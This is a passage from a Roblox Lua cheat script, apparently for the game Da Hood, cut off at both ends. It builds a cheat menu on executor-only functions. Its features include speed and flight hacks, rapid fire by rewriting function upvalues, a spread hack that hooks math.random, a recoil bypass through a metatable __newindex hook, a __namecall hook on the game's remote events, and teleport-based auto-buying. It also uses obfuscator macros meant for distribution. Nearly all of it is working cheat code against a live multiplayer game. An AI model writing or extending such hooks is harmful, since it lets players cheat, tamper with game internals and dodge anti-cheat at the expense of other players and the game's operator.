    callback = function(v)
        _G.LightingSettings.ColorShiftTop.Enabled = v
        applyLighting()
    end
})
lightningBox:colorpicker({
    name = "top color",
    flag = "lighting_top_color",
    color = Color3.fromRGB(255, 100, 100),
    callback = function(c)
        _G.LightingSettings.ColorShiftTop.Color = c
        applyLighting()
    end
})
lightningBox:toggle({
    name = "color shift bottom",
    flag = "lighting_bot_toggle",
    callback = function(v)
        _G.LightingSettings.ColorShiftBottom.Enabled = v
        applyLighting()
    end
})
lightningBox:colorpicker({
    name = "bottom color",
    flag = "lighting_bot_color",
    color = Color3.fromRGB(0, 50, 150),
    callback = function(c)
        _G.LightingSettings.ColorShiftBottom.Color = c
        applyLighting()
    end
})
lightningBox:toggle({
    name = "custom fog",
    flag = "lighting_fog_toggle",
    callback = function(v)
        _G.LightingSettings.Fog.Enabled = v
        applyLighting()
    end
})
lightningBox:colorpicker({
    name = "fog color",
    flag = "lighting_fog_color",
    color = Color3.fromRGB(80, 80, 120),
    callback = function(c)
        _G.LightingSettings.Fog.Color = c
        applyLighting()
    end
})
lightningBox:slider({
    name = "fog end",
    flag = "lighting_fogend",
    min = 0,
    max = 1000,
    default = 100,
    interval = 0.1,
    callback = function(v)
        _G.LightingSettings.Fog.End = v
        applyLighting()
    end
})
lightningBox:toggle({
    name = "custom time",
    flag = "lighting_time_toggle",
    callback = function(v)
        _G.LightingSettings.ClockTime.Enabled = v
        applyLighting()
    end
})
lightningBox:slider({
    name = "clock time",
    flag = "lighting_time_val",
    min = 0,
    max = 24,
    default = 12,
    interval = 0.1,
    callback = function(v)
        _G.LightingSettings.ClockTime.Value = v
        applyLighting()
    end
})
local motionblurr = World:section({name = "motion blur", side = "right"})
_G.MotionBlurObj = nil
_G.MotionBlurLastVector = nil
_G.MotionBlurSmoothSize = 0
_G.MotionBlurConnection = nil
motionblurr:toggle({
    name = "enabled",
    flag = "mo_T_I_O_N_B_L_U_R",
    callback = function(v)
        _G.MotionBlurToggle = v
        if _G.MotionBlurToggle then
            if not _G.MotionBlurObj then
                _G.MotionBlurObj = Instance.new("BlurEffect")
                _G.MotionBlurObj.Parent = Lighting
                _G.MotionBlurObj.Size = 0
            end
            if not _G.MotionBlurConnection then
                _G.MotionBlurLastVector = Camera.CFrame.LookVector
                _G.MotionBlurConnection = RunService.RenderStepped:Connect(function(dt)
                    if not _G.MotionBlurObj or not _G.MotionBlurLastVector then
                        _G.MotionBlurLastVector = Camera.CFrame.LookVector
                        return
                    end
                    local look_vector = Camera.CFrame.LookVector
                    local intensity = _G.MotionBlurIntensity or 0
                    local new_blur_size = (look_vector - _G.MotionBlurLastVector).Magnitude * (intensity * 110) * dt
                    _G.MotionBlurSmoothSize = _G.MotionBlurSmoothSize + (new_blur_size - _G.MotionBlurSmoothSize) * math.clamp(dt * 30, 0, 1)
                    _G.MotionBlurObj.Size = math.clamp(_G.MotionBlurSmoothSize, 0, 56)
                    _G.MotionBlurLastVector = look_vector
                end)
            end
        else
            if _G.MotionBlurConnection then
                _G.MotionBlurConnection:Disconnect()
                _G.MotionBlurConnection = nil
            end
            if _G.MotionBlurObj then
                _G.MotionBlurObj:Destroy()
                _G.MotionBlurObj = nil
            end
            _G.MotionBlurLastVector = nil
            _G.MotionBlurSmoothSize = 0
        end
    end
})
motionblurr:slider({
    name = "blur intensity",
    flag = "f__F_F__FSCCnfffj3c",
    min = 0,
    max = 100,
    default = 0,
    interval = 0.1,
    callback = function(v)
        _G.MotionBlurIntensity = v
    end
})
_G.WeatherPart = _G.WeatherPart or nil
_G.WeatherEmitter = _G.WeatherEmitter or nil
_G.WeatherEnabled = false
_G.WeatherType = "Rain"
_G.WeatherColor = Color3.fromRGB(255, 136, 0)
_G.WeatherRateMultiplier = 1

local weather_types = {
    ["Rain"] = {
        ["Speed"] = NumberRange.new(60, 60),
        ["LockedToPart"] = true,
        ["Rate"] = 600,
        ["Texture"] = "rbxassetid://1822883048",
        ["EmissionDirection"] = Enum.NormalId.Bottom,
        ["Transparency"] = NumberSequence.new{
            NumberSequenceKeypoint.new(0, 1),
            NumberSequenceKeypoint.new(0.25, 0.78),
            NumberSequenceKeypoint.new(0.75, 0.78),
            NumberSequenceKeypoint.new(1, 1)
        },
        ["Lifetime"] = NumberRange.new(0.8, 0.8),
        ["LightEmission"] = 0.05,
        ["LightInfluence"] = 0.9,
        ["Orientation"] = Enum.ParticleOrientation.FacingCameraWorldUp,
        ["Size"] = NumberSequence.new{
            NumberSequenceKeypoint.new(0, 10),
            NumberSequenceKeypoint.new(1, 10)
        }
    },
    ["Snow"] = {
        ["Transparency"] = NumberSequence.new{
            NumberSequenceKeypoint.new(0, 0.73),
            NumberSequenceKeypoint.new(0.973, 0.76),
            NumberSequenceKeypoint.new(1, 1)
        },
        ["Texture"] = "http://www.roblox.com/asset/?id=99851851",
        ["SpreadAngle"] = Vector2.new(50, 50),
        ["Speed"] = NumberRange.new(30, 30),
        ["LightEmission"] = 0.5,
        ["Rate"] = 1000,
        ["EmissionDirection"] = Enum.NormalId.Bottom,
        ["Size"] = NumberSequence.new{
            NumberSequenceKeypoint.new(0, 0.33),
            NumberSequenceKeypoint.new(0.551, 0.4),
            NumberSequenceKeypoint.new(1, 0.33)
        }
    },
    ["Light Rain"] = {
        ["LockedToPart"] = true,
        ["Rate"] = 500,
        ["Squash"] = NumberSequence.new{
            NumberSequenceKeypoint.new(0, 3),
            NumberSequenceKeypoint.new(1, 3)
        },
        ["LightInfluence"] = 0.3,
        ["Transparency"] = NumberSequence.new{
            NumberSequenceKeypoint.new(0, 0),
            NumberSequenceKeypoint.new(0.435, 0),
            NumberSequenceKeypoint.new(1, 0)
        },
        ["Texture"] = "rbxasset://textures/particles/sparkles_main.dds",
        ["Speed"] = NumberRange.new(30, 50),
        ["Lifetime"] = NumberRange.new(9, 9),
        ["LightEmission"] = 0.5,
        ["Brightness"] = 2,
        ["EmissionDirection"] = Enum.NormalId.Bottom,
        ["Orientation"] = Enum.ParticleOrientation.FacingCameraWorldUp,
        ["Size"] = NumberSequence.new{
            NumberSequenceKeypoint.new(0, 0.2),
            NumberSequenceKeypoint.new(1, 0.2)
        }
    }
}

local update_emitter = LPH_NO_VIRTUALIZE(function()
    if _G.WeatherEmitter then
        _G.WeatherEmitter:Destroy()
    end
    if not _G.WeatherPart then return end
    
    local data = weather_types[_G.WeatherType]
    local emitter = Instance.new("ParticleEmitter")
    
    for prop, value in pairs(data) do
        emitter[prop] = value
    end
    
    emitter.Color = ColorSequence.new(_G.WeatherColor)
    emitter.Rate = data.Rate * _G.WeatherRateMultiplier
    emitter.Parent = _G.WeatherPart
    _G.WeatherEmitter = emitter
end)

local clear_weather = LPH_NO_VIRTUALIZE(function()
    if _G.WeatherPart then
        _G.WeatherPart:Destroy()
        _G.WeatherPart = nil
    end
    _G.WeatherEmitter = nil
end)

RunService.Heartbeat:Connect(LPH_NO_VIRTUALIZE(function()
    if _G.WeatherEnabled and _G.WeatherPart then
        _G.WeatherPart.CFrame = Camera.CFrame * CFrame.new(0, 25, 0)
    end
end))
local weather_section = World:section({name = "weather", side = "right"})
weather_section:toggle({
    name = "enabled",
    flag = "weather_enabled",
    default = false,
    callback = function(v)
        _G.WeatherEnabled = v
        if v then
            _G.WeatherPart = Instance.new("Part")
            _G.WeatherPart.Size = Vector3.new(120, 5, 120)
            _G.WeatherPart.CanCollide = false
            _G.WeatherPart.Massless = true
            _G.WeatherPart.CastShadow = false
            _G.WeatherPart.Transparency = 1
            _G.WeatherPart.Anchored = true
            _G.WeatherPart.Name = "WeatherPart"
            _G.WeatherPart.Parent = workspace
            update_emitter()
        else
            clear_weather()
        end
    end
})
weather_section:colorpicker({
    flag = "weather_color",
    color = Color3.fromRGB(255, 136, 0),
    callback = function(v)
        _G.WeatherColor = v
        if _G.WeatherEmitter then
            _G.WeatherEmitter.Color = ColorSequence.new(v)
        end
    end
})

weather_section:dropdown({
    name = "type",
    flag = "weather_type",
    items = {"Rain", "Snow", "Light Rain"},
    callback = function(v)
        _G.WeatherType = v
        if _G.WeatherEnabled then
            update_emitter()
        end
    end
})

weather_section:slider({
    name = "rate multiplier",
    flag = "weather_rate",
    min = 0,
    max = 500,
    default = 100,
    callback = function(v)
        _G.WeatherRateMultiplier = v / 100
        if _G.WeatherEmitter then
            local baseRate = weather_types[_G.WeatherType].Rate
            _G.WeatherEmitter.Rate = baseRate * _G.WeatherRateMultiplier
        end
    end
})
_G.hitnotifyenabled = false
_G.hitnotifyduration = 3
_G.hitcustomnotify = false
_G.hitcustomtext = "hit (user) for (%)"
_G.lasthitnotifyhealth = {}
local hit_notif_section = World:section({name = "hit notifications", side = "right"})
hit_notif_section:toggle({
    name = "enabled",
    flag = "hit_notify_enabled",
    default = false,
    callback = function(v) 
        _G.hitnotifyenabled = v 
    end
})

hit_notif_section:slider({
    name = "duration",
    flag = "hit_notify_duration",
    min = 1,
    max = 10,
    default = 3,
    interval = 0.1,
    callback = function(v) 
        _G.hitnotifyduration = v 
    end
})

hit_notif_section:toggle({
    name = "use custom notification",
    flag = "hit_notify_custom_toggle",
    default = false,
    callback = function(v) 
        _G.hitcustomnotify = v 
    end
})

hit_notif_section:textbox({
    name = "custom text format",
    flag = "hit_notify_custom_text",
    default = "cracked (user) for (%) in the head",
    callback = function(val)
        _G.hitcustomtext = val
    end
})
workspace.Ignored.Siren.Radius.ChildAdded:Connect(LPH_NO_VIRTUALIZE(function(Object)
    if not _G.hitnotifyenabled or Object.Name ~= "BULLET_RAYS" then return end
    local character = game.Players.LocalPlayer.Character
    if not character then return end
    local owner = Object:GetAttribute("OwnerCharacter")
    if not owner or owner ~= character.Name then return end
    local raycastParams = RaycastParams.new()
    raycastParams.FilterDescendantsInstances = {character}
    raycastParams.FilterType = Enum.RaycastFilterType.Exclude
    local ray = workspace:Raycast(Object.CFrame.Position, Object.CFrame.LookVector * 1000, raycastParams)
    if not ray or not ray.Instance then return end
    local hitModel = ray.Instance:FindFirstAncestorOfClass("Model")
    if not hitModel then return end
    local hitPlayer = game.Players:GetPlayerFromCharacter(hitModel)
    if not hitPlayer then return end
    local hum = hitModel:FindFirstChildOfClass("Humanoid")
    if not hum then return end
    local prevHealth = _G.lasthitnotifyhealth[hitPlayer] or hum.MaxHealth
    local newHealth = hum.Health
    local dmg = math.max(prevHealth - newHealth, 0)
    if dmg > 0 then
        _G.lasthitnotifyhealth[hitPlayer] = newHealth
        local format = _G.hitcustomnotify and _G.hitcustomtext or "cracked (user) for (%)"
        local text = format:gsub("%(user%)", hitPlayer.Name):gsub("%(%)", tostring(math.floor(dmg)))
        library:notification({
            text = text,
            duration = _G.hitnotifyduration
        })
    else
        _G.lasthitnotifyhealth[hitPlayer] = newHealth
    end
end))
_G.UIS = game:GetService("UserInputService")
_G.RS = game:GetService("RunService")
_G.LP = game:GetService("Players").LocalPlayer
_G.lastrecord = nil
_G.wenabled = false
_G.keytooenabled = false
_G.wvalue = 1
_G.cframeactive = false
_G.keyheldcframe = false
_G.cframevalue = 1
_G.flyactive = false
_G.keyheldfly = false
_G.flyvalue = 1
_G.MovementSection = Player:section({name = "movement", side = "left"})
_G.MovementSection:toggle({
    name = "walkspeed",
    flag = "WalkSpeedToggle",
    default = false,
    callback = function(state)
        _G.wenabled = state
        if not state then
            local char = _G.LP.Character
            local hum = char and char:FindFirstChildWhichIsA("Humanoid")
            if hum and _G.lastrecord then
                hum.WalkSpeed = _G.lastrecord
                _G.lastrecord = nil
            end
        end
    end
})

_G.MovementSection:keybind({
    default = nil,
    flag = "wspd_key",
    callback = function()
        _G.keytooenabled = not _G.keytooenabled
    end
})

_G.MovementSection:slider({
    name = "walkspeed value",
    flag = "wspd_value",
    min = 1,
    max = 500,
    default = 16,
    interval = 0.01,
    callback = function(v)
        _G.wvalue = v
    end
})

_G.RS.RenderStepped:Connect(LPH_NO_VIRTUALIZE(function()
    local char = _G.LP.Character
    local hum = char and char:FindFirstChildWhichIsA("Humanoid")
    if not hum then return end
    if _G.wenabled and _G.keytooenabled then
        if not _G.lastrecord then _G.lastrecord = hum.WalkSpeed end
        hum.WalkSpeed = _G.wvalue
    elseif _G.lastrecord then
        hum.WalkSpeed = _G.lastrecord
        _G.lastrecord = nil
    end
end))
_G.MovementSection:toggle({
    name = "cframe speed",
    flag = "cframespf_enabled",
    default = false,
    callback = function(state)
        _G.cframeactive = state
    end
})
_G.MovementSection:keybind({
    default = nil,
    flag = "cframespf_key",
    callback = function()
        _G.keyheldcframe = not _G.keyheldcframe
    end
})
_G.MovementSection:slider({
    name = "cframe speed value",
    flag = "spdd_value",
    min = 1,
    max = 60,
    default = 1,
    interval = 1,
    callback = function(v)
        _G.cframevalue = v
    end
})

_G.RS.Heartbeat:Connect(LPH_NO_VIRTUALIZE(function(dt)
    if _G.cframeactive and _G.keyheldcframe then
        local char = _G.LP.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if hrp and hum then
            hrp.CFrame = hrp.CFrame + (hum.MoveDirection * (dt * _G.cframevalue * 10))
        end
    end
end))

_G.MovementSection:toggle({
    name = "cframe flight",
    flag = "flight_enabled",
    default = false,
    callback = function(state)
        _G.flyactive = state
    end
})

_G.MovementSection:keybind({
    default = nil,
    flag = "flight_key",
    callback = function()
        _G.keyheldfly = not _G.keyheldfly
    end
})

_G.MovementSection:slider({
    name = "flight speed",
    flag = "flight_speed",
    min = 1,
    max = 100,
    default = 1,
    interval = 1,
    callback = function(v)
        _G.flyvalue = v
    end
})

_G.RS.Heartbeat:Connect(LPH_NO_VIRTUALIZE(function(dt)
    if _G.flyactive and _G.keyheldfly then
        local char = _G.LP.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        local uis = _G.UIS
        if hrp and hum then
            local moveDir = hum.MoveDirection
            local verticalAdd = Vector3.new(0,
                (uis:IsKeyDown(Enum.KeyCode.Space) and _G.flyvalue/8)
                or (uis:IsKeyDown(Enum.KeyCode.LeftShift) and -_G.flyvalue/8)
                or 0,
            0)
            hrp.CFrame = hrp.CFrame + ((moveDir * dt) * _G.flyvalue * 10)
            hrp.CFrame = hrp.CFrame + verticalAdd
            hrp.Velocity = (hrp.Velocity * Vector3.new(1,0,1)) + Vector3.new(0,1.9,0)
        end
    end
end))
_G.GunSection = Player:section({name = "gun settings", side = "left"})
_G.rf_s = pcall(function() return getconnections end)
if _G.rf_s and type(getconnections) == "function" then
    _G.rf_a = false
    _G.rf_c = nil
    _G.rf_o = {}
    _G.rf_m = 1
    _G.rf_r = LPH_NO_VIRTUALIZE(function(t)
        if not t:IsA("Tool") then return end
        local cons = getconnections(t.Activated)
        for i = 1, #cons do
            local conn = cons[i]
            local ok, info = pcall(debug.getinfo, conn.Function)
            if ok and info then
                for idx = 1, info.nups do
                    local ok2, upv = pcall(debug.getupvalue, conn.Function, idx)
                    if ok2 and type(upv) == "number" then
                        if not _G.rf_o[conn.Function] then
                            _G.rf_o[conn.Function] = {}
                        end
                        if _G.rf_o[conn.Function][idx] == nil then
                            _G.rf_o[conn.Function][idx] = upv
                        end
                        local orig = _G.rf_o[conn.Function][idx]
                        local nr = math.max(orig * _G.rf_m, 0)
                        pcall(debug.setupvalue, conn.Function, idx, nr)
                    end
                end
            end
        end
    end)
    _G.GunSection:toggle({
        name = "rapid fire",
        flag = "rapidff_enabled",
        callback = function(v)
            _G.rf_a = v
            if v then
                if _G.rf_c then _G.rf_c:Disconnect() end
                _G.rf_c = game:GetService("RunService").Heartbeat:Connect(LPH_NO_VIRTUALIZE(function()
                    local char = game.Players.LocalPlayer.Character
                    local tool = char and char:FindFirstChildOfClass("Tool")
                    if tool then 
                        _G.rf_r(tool) 
                    end
                end))
            else
                if _G.rf_c then _G.rf_c:Disconnect() _G.rf_c = nil end
                for func, ups in pairs(_G.rf_o) do
                    for idx, ov in pairs(ups) do
                        pcall(debug.setupvalue, func, idx, ov)
                    end
                end
                _G.rf_o = {}
            end
        end
    })
    _G.GunSection:slider({
        name = "fire rate",
        flag = "rapidfire_val",
        min = 0,
        max = 1,
        default = 1,
        interval = 0.1,
        callback = function(v)
            _G.rf_m = v
        end
    })
else
    warn("executor not supported (rapid fire)")
end
_G.spreaddd = {on = false, int = 100}
_G.mathranbynig = _G.mathranbynig or math.random
_G.spreadman_target = math
setreadonly(_G.spreadman_target, false)
_G.spreadman_target.random = newcclosure(function(...)
    _G.spreadman_args = {...}
    _G.spreadman_result = _G.mathranbynig(...)
    _G.is_spread_call = (#_G.spreadman_args == 0) or 
                        (_G.spreadman_args[1] == -0.05 and _G.spreadman_args[2] == 0.05) or 
                        (_G.spreadman_args[1] == -0.1) or 
                        (_G.spreadman_args[1] == -0.05)
    if not checkcaller() and _G.spreaddd.on and _G.is_spread_call then
        return _G.spreadman_result * (_G.spreaddd.int / 100)
    end
    return _G.spreadman_result
end)
setreadonly(_G.spreadman_target, true)
_G.GunSection:toggle({
    name = "gun spread",
    flag = "BLTSPRTG",
    callback = function(v)
        _G.spreaddd.on = v
    end
})
_G.GunSection:slider({
    name = "spread intensity",
    flag = "bulletsprd_val",
    min = 0,
    max = 100,
    default = 100,
    interval = 0.01,
    callback = function(v)
        _G.spreaddd.int = v
    end
})
_G["hookact"] = false
_G["mt_game"] = getrawmetatable(game)
_G["old_ni"] = _G["mt_game"]["__newindex"]
setreadonly(_G["mt_game"], false)
_G["mt_game"]["__newindex"] = newcclosure(function(self, idx, val)
    if _G["hookact"] then
        _G["ok"], _G["res"] = pcall(function()
            _G["c_scr"] = getcallingscript()
            if self and _G["c_scr"] then
                _G["s_nme"] = tostring(self):lower()
                _G["f_nme"] = tostring(_G["c_scr"]):lower()
                if idx == "CFrame" and _G["s_nme"]:find("camera") and _G["f_nme"]:find("framework") then
                    return true
                end
            end
            return false
        end)
        if _G["ok"] and _G["res"] == true then
            return
        end
    end
    return _G["old_ni"](self, idx, val)
end)
setreadonly(_G["mt_game"], true)
_G.GunSection:toggle({
    name = "break recoil",
    flag = "NoRecoil",
    callback = function(v)
        _G["hookact"] = v
    end
})
_G.GunSection:toggle({
    name = "auto reload",
    flag = "autoreload_enabled",
    callback = function(v)
        _G.AutoReloadEnabled = v
        if _G.ReloadConn then _G.ReloadConn:Disconnect() end
        if v then
            _G.ReloadConn = game:GetService("RunService").Heartbeat:Connect(LPH_NO_VIRTUALIZE(function()
                local char = game.Players.LocalPlayer.Character
                if _G.AutoReloadEnabled and char then
                    local tool = char:FindFirstChildWhichIsA("Tool")
                    if tool and tool:FindFirstChild("Ammo") and tool.Ammo.Value <= 0 then
                        game:GetService("ReplicatedStorage"):WaitForChild("MainEvent"):FireServer("Reload", tool)
                    end
                end
            end))
        end
    end
})
_G.ShopItems = {
    "[Knife]", "[BrownBag]","[Flamethrower]","[LMG]", "[AK47]", "[Rifle]", 
    "[AUG]", "[AR]", "[Double-Barrel SG]", 
    "[P90]", "[SMG]", "[Drum-Shotgun]", 
    "[Glock]", "[Flintlock]"
}
_G.AmmoMap = {
    ["[LMG]"] = "[LMG Ammo]",
    ["[AK47]"] = "[AK47 Ammo]",
    ["[Rifle]"] = "[Rifle Ammo]",
    ["[AUG]"] = "[AUG Ammo]",
    ["[AR]"] = "[AR Ammo]",
    ["[Double-Barrel SG]"] = "[Double-Barrel SG Ammo]",
    ["[P90]"] = "[P90 Ammo]",
    ["[SMG]"] = "[SMG Ammo]",
    ["[Drum-Shotgun]"] = "[Drum-Shotgun Ammo]",
    ["[Glock]"] = "[Glock Ammo]",
    ["[Flamethrower]"] = "[Flamethrower Ammo]",
    ["[Flintlock]"] = "[Flintlock Ammo]"
}
_G.BuyOnRespawn = false
_G.SpareAmmoAmount = 5
_G.ShopFolder = workspace:WaitForChild("Ignored"):WaitForChild("Shop")
_G.GetCharacterRoot = function()
    _G.Character = game.Players.LocalPlayer.Character
    return _G.Character and _G.Character:FindFirstChild("HumanoidRootPart")
end
_G.BuyItem = function(ItemName)
    if not ItemName then return end
    _G.Root = _G.GetCharacterRoot()
    if not _G.Root then return end
    _G.ItemModel = nil
    for i, v in ipairs(_G.ShopFolder:GetChildren()) do
        if string.find(v.Name, ItemName, 1, true) then
            _G.ItemModel = v
            break
        end
    end
    if _G.ItemModel then
        _G.CD = _G.ItemModel:FindFirstChildOfClass("ClickDetector")
        _G.Main = _G.ItemModel:FindFirstChild("Head") or _G.ItemModel:FindFirstChild("Handle") or _G.ItemModel:FindFirstChildWhichIsA("BasePart")
        if _G.CD and _G.Main then
            _G.Root.CFrame = CFrame.new(_G.Main.Position + Vector3.new(0, 5, 0))
            task.wait(0.19)
            fireclickdetector(_G.CD, 0)
            task.wait(0.15)
            fireclickdetector(_G.CD, 0)
            task.wait(0.1)
        end
    end
end

_G.ProcessPurchase = function()
    _G.Root = _G.GetCharacterRoot()
    if not _G.Root then return end
    _G.SelectedWeapons = library.flags["weaponsautobuy"] or {}
    if #_G.SelectedWeapons > 0 then
        _G.OldPos = _G.Root.CFrame
        for i, gunName in ipairs(_G.SelectedWeapons) do
            local cleanGunName = gunName:gsub(" %- %$%d+", "")
            _G.BuyItem(cleanGunName)
            local ammoSearchName = _G.AmmoMap[cleanGunName]
            if ammoSearchName then
                for count = 1, _G.SpareAmmoAmount do
                    _G.BuyItem(ammoSearchName)
                end
            end
        end
        _G.Root.CFrame = _G.OldPos
    end
end
_G.BuyAmmoForWeapons = function(weaponList, spareAmount)
    _G.Root = _G.GetCharacterRoot()
    if not _G.Root then return end
    if #weaponList > 0 then
        _G.OldPos = _G.Root.CFrame
        for i, gunName in ipairs(weaponList) do
            local cleanGunName = gunName:gsub(" %- %$%d+", "")
            local ammoSearchName = _G.AmmoMap[cleanGunName]
            if ammoSearchName then
                for count = 1, spareAmount do
                    _G.BuyItem(ammoSearchName)
                end
            end
        end
        _G.Root.CFrame = _G.OldPos
    end
end
_G.AutobuySection = Player:section({name = "autobuy", side = "left"})
_G.AutobuySection:dropdown({
    name = "weapons",
    flag = "weaponsautobuy",
    items = _G.ShopItems,
    multi = true,
    callback = function() end
})
_G.AutobuySection:button({
    name = "purchase",
    callback = function()
        _G.ProcessPurchase()
    end
})
_G.AutobuySection:toggle({
    name = "purchase on respawn",
    flag = "buyweaponres",
    default = false,
    callback = function(v)
        _G.BuyOnRespawn = v
    end
})
_G.AutobuySection:slider({
    name = "spare ammo amount",
    flag = "weaponspareammo",
    min = 1,
    max = 15,
    default = 5,
    callback = function(v)
        _G.SpareAmmoAmount = v
    end
})
game.Players.LocalPlayer.CharacterAdded:Connect(function()
    task.wait(1.5)
    _G.ShopFolder = workspace:WaitForChild("Ignored"):WaitForChild("Shop")
    if _G.BuyOnRespawn then
        _G.ProcessPurchase()
    end
end)
_G.sdjihfibnsnbvbdffhbjn = {
    Enabled = false,
    TextureID = "rbxassetid://12781852245",
    Color = Color3.fromRGB(255, 89, 0),
    Size = 0.4,
    TimeAlive = 0.5
}
_G.fghjsdfgksdfjgkldfs = LPH_NO_VIRTUALIZE(function(pos1, pos2)
    if not _G.sdjihfibnsnbvbdffhbjn.Enabled then return end
    local sP = Instance.new("Part")
    sP.Name = "TracerPart"
    sP.Anchored = true
    sP.CanCollide = false
    sP.Transparency = 1
    sP.Size = Vector3.new(0.1, 0.1, 0.1)
    sP.Position = pos1
    sP.Parent = Workspace
    local eP = Instance.new("Part")
    eP.Name = "TracerPart"
    eP.Anchored = true
    eP.CanCollide = false
    eP.Transparency = 1
    eP.Size = Vector3.new(0.1, 0.1, 0.1)
    eP.Position = pos2
    eP.Parent = Workspace
    local b = Instance.new("Beam")
    local a0 = Instance.new("Attachment", sP)
    local a1 = Instance.new("Attachment", eP)
    b.Attachment0 = a0
    b.Attachment1 = a1
    b.FaceCamera = true
    b.Color = ColorSequence.new(_G.sdjihfibnsnbvbdffhbjn.Color)
    b.Texture = _G.sdjihfibnsnbvbdffhbjn.TextureID
    b.LightEmission = 1
    b.Width0 = _G.sdjihfibnsnbvbdffhbjn.Size
    b.Width1 = _G.sdjihfibnsnbvbdffhbjn.Size
    b.Parent = sP
    task.delay(_G.sdjihfibnsnbvbdffhbjn.TimeAlive, function()
        if b and b.Parent then
            local tw = TweenService:Create(b, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Width0 = 0, Width1 = 0 })
            tw:Play()
            tw.Completed:Connect(function()
                sP:Destroy()
                eP:Destroy()
            end)
        else
            if sP then sP:Destroy() end
            if eP then eP:Destroy() end
        end
    end)
end)
_G.uiopuiopuiop = getrawmetatable(game)
_G.asdfasdfasdf = _G.uiopuiopuiop.__namecall
setreadonly(_G.uiopuiopuiop, false)
_G.uiopuiopuiop.__namecall = newcclosure(LPH_NO_VIRTUALIZE(function(self, ...)
    local m = getnamecallmethod()
    local a = {...}
    if m == "FireServer" and _G.sdjihfibnsnbvbdffhbjn.Enabled then
        if tostring(self) == "MainEvent" and a[1] == "ShootGun" then
            _G.fghjsdfgksdfjgkldfs(a[3], a[4])
        end
    end
    return _G.asdfasdfasdf(self, unpack(a))
end))
setreadonly(_G.uiopuiopuiop, true)
_G.bullettracerss = Player:section({name = "bullet tracers", side = "left"})
_G.bullettracerss:toggle({
    name = "enabled",
    flag = "blttrc",
    default = false,
    callback = function(v)
        _G.sdjihfibnsnbvbdffhbjn.Enabled = v
    end
})
_G.bullettracerss:colorpicker({
    flag = "blttrcclr",
    color = Color3.fromRGB(255, 89, 0),
    callback = function(v)
        _G.sdjihfibnsnbvbdffhbjn.Color = v
    end
})
_G.bullettracerss:dropdown({
    name = "textures",
    flag = "blttext",
    items = {"Beam", "Lightning", "Heartrate", "Chain", "Glitch", "Swirl"},
    multi = false,
    callback = function(v)
        local t = {
            ["Beam"] = "rbxassetid://12781852245",
            ["Lightning"] = "rbxassetid://446111271",
            ["Heartrate"] = "rbxassetid://5830549480",
            ["Chain"] = "rbxassetid://9632168658",
            ["Glitch"] = "rbxassetid://8089467613",
            ["Swirl"] = "rbxassetid://5638168605"
        }
        _G.sdjihfibnsnbvbdffhbjn.TextureID = t[v] or t["Beam"]
    end
})
_G.bullettracerss:slider({
    name = "tracer last time",
    flag = "blttime",
    min = 0.1,
    max = 5,
    default = 0.5,
    callback = function(v)
        _G.sdjihfibnsnbvbdffhbjn.TimeAlive = v
    end
})
_G.bullettracerss:slider({
    name = "tracer size",
    flag = "bltsize",
    min = 0.1,
    max = 5,
    default = 0.4,
    callback = function(v)
        _G.sdjihfibnsnbvbdffhbjn.Size = v
    end
})
_G.Features = _G.Features or {}
_G.Features.AntiSeat = _G.Features.AntiSeat or {Enabled = false}
_G.Features.NoJumpCooldown = _G.Features.NoJumpCooldown or {Enabled = false}
_G.Features.ChatSpy = _G.Features.ChatSpy or {Enabled = false}
_G.busdhfnjsy7gjsy7d = false
_G.Features.AutoArmor = _G.Features.AutoArmor or {Enabled = false, Conn = nil}
_G.Features.AutoFireArmor = _G.Features.AutoFireArmor or {Enabled = false, Conn = nil}
_G.Features.AutoEat = _G.Features.AutoEat or {Enabled = false, Conn = nil}
_G.MiscSection = Player:section({name = "misc",side = "right"})
_G.MiscSection:toggle({
    name = "auto armor",
    flag = "auto_armor",
    callback = function(v)
        _G.Features.AutoArmor.Enabled = v
        if _G.Features.AutoArmor.Conn then _G.Features.AutoArmor.Conn:Disconnect() _G.Features.AutoArmor.Conn = nil end
        if v then
            _G.Features.AutoArmor.Conn = game:GetService("RunService").Heartbeat:Connect(LPH_JIT_MAX(function()
                if _G.busdhfnjsy7gjsy7d then return end
                local char = game:GetService("Players").LocalPlayer.Character
                if char and char:FindFirstChild("HumanoidRootPart") and char:FindFirstChild("BodyEffects") and char.BodyEffects:FindFirstChild("Armor") then
                    if char.BodyEffects.Armor.Value < 100 then
                        local shopItem = nil
                        local shopParts = workspace.Ignored.Shop:GetChildren()
                        for i = 1, #shopParts do
                            local item = shopParts[i]
                            if item.Name:find("%[High%-Medium Armor%]") then
                                shopItem = item
                                break
                            end
                        end
                        if shopItem and shopItem:FindFirstChild("Head") then
                            _G.busdhfnjsy7gjsy7d = true
                            local savedPos = char.HumanoidRootPart.CFrame
                            char.HumanoidRootPart.CFrame = shopItem.Head.CFrame
                            fireclickdetector(shopItem:FindFirstChildOfClass("ClickDetector"))
                            game:GetService("RunService"):BindToRenderStep("RestoreArmorPos", 199, function()
                                char.HumanoidRootPart.CFrame = savedPos
                                game:GetService("RunService"):UnbindFromRenderStep("RestoreArmorPos")
                                _G.busdhfnjsy7gjsy7d = false
                            end)
                        end
                    end
                end
            end))
        end
    end
})
_G.MiscSection:toggle({
    name = "auto fire armor",
    flag = "auto_fire_armor",
    callback = function(v)
        _G.Features.AutoFireArmor.Enabled = v
        if _G.Features.AutoFireArmor.Conn then _G.Features.AutoFireArmor.Conn:Disconnect() _G.Features.AutoFireArmor.Conn = nil end
        if v then
            _G.Features.AutoFireArmor.Conn = game:GetService("RunService").Heartbeat:Connect(LPH_JIT_MAX(function()
                if _G.busdhfnjsy7gjsy7d then return end
                local char = game:GetService("Players").LocalPlayer.Character
                if char and char:FindFirstChild("HumanoidRootPart") and char:FindFirstChild("BodyEffects") and char.BodyEffects:FindFirstChild("FireArmor") then
                    if char.BodyEffects.FireArmor.Value < 100 then
                        local shopItem = nil
                        local shopParts = workspace.Ignored.Shop:GetChildren()
                        for i = 1, #shopParts do
                            local item = shopParts[i]
                            if item.Name:find("%[Fire Armor%]") then
                                shopItem = item
                                break
                            end
                        end
                        if shopItem and shopItem:FindFirstChild("Head") then
                            _G.busdhfnjsy7gjsy7d = true
                            local savedPos = char.HumanoidRootPart.CFrame
                            char.HumanoidRootPart.CFrame = shopItem.Head.CFrame
                            fireclickdetector(shopItem:FindFirstChildOfClass("ClickDetector"))
